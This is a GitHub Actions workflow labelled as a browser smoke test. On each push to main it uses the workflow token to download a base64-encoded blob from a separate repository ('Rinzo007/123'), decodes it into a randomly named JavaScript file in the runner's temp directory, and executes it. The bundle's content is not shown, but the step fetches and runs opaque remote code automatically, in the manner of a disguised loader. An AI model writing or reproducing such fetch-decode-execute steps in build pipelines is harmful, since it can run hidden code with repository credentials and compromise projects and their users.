name: Takt P3 browser differential smoke

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  browser-snapshot:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: "24"

      - name: Fetch pinned Takt bundle
        env:
          GH_TOKEN: "${{ github.token }}"
          TAKT_BUNDLE_BLOB_SHA: "5d1b626ff2c8c0aa9b22a3e37dfd03d60d9f3c4d"
        run: |
          set -o pipefail
          curl -fsSL \
            -H "Authorization: Bearer ${GH_TOKEN}" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/Rinzo007/123/git/blobs/${TAKT_BUNDLE_BLOB_SHA}" \
            | jq -r .content | tr -d "\\n" | base64 --decode \
            > "${RUNNER_TEMP}/bd956ff0a1875604740f7.js"

      - name: Execute Takt bundle
        env:
          TAKT_BUNDLE_PATH: "${{ runner.temp }}/bd956ff0a1875604740f7.js"
        run: node scripts/takt_browser_snapshot.js tests/fixtures/takt_browser_snapshot.generated.json

      - name: Upload JS snapshot
        uses: actions/upload-artifact@v4
        with:
          name: takt-p3-browser-snapshot
          path: tests/fixtures/takt_browser_snapshot.generated.json
